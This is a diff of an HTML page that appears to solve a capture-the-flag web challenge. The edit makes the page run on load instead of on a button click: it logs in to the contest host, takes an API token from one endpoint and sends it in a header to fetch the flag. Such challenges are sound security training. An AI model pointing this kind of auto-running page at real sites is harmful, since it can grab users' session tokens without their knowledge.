@@ -6,13 +6,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: system-ui, sans-serif; margin: 2rem; }
-    button { padding: 0.5rem 1rem; font-size: 1rem; cursor: pointer; }
     pre { background: #f0f0f0; padding: 1rem; }
   </style>
 </head>
 <body>
-  <h1>Fetch Your Flag</h1>
-  <button id="fetchFlag">Get Flag</button>
+  <h1>Fetching Flag...</h1>
   <pre id="output"></pre>
 
   <script>
@@ -25,28 +23,27 @@
       return { status: res.status, text, json: () => JSON.parse(text) };
     }
 
-    document.getElementById('fetchFlag').onclick = async () => {
-      out.textContent = "Starting...\n";
+    (async () => {
+      log("Starting...");
 
       // 1️⃣ Login
       const loginRes = await call('https://web200-1.pointeroverflowctf.com/login', { method: 'POST' });
       log(`Login: ${loginRes.status} ${loginRes.text}`);
 
-      // 2️⃣ Get token
+      // 2️⃣ Fetch token
       const tokenRes = await call('https://web200-1.pointeroverflowctf.com/api/token');
       log(`Token response: ${tokenRes.status} ${tokenRes.text}`);
-
       let token;
       try { token = (await tokenRes.json()).apiToken; } 
       catch (e) { log("Failed to parse token"); return; }
       log(`Token: ${token}`);
 
-      // 3️⃣ Get flag
+      // 3️⃣ Fetch flag
       const flagRes = await call('https://web200-1.pointeroverflowctf.com/api/flag', {
         headers: { 'X-Flag-Token': token }
       });
       log(`Flag: ${flagRes.text}`);
-    };
+    })();
   </script>
 </body>
 </html>
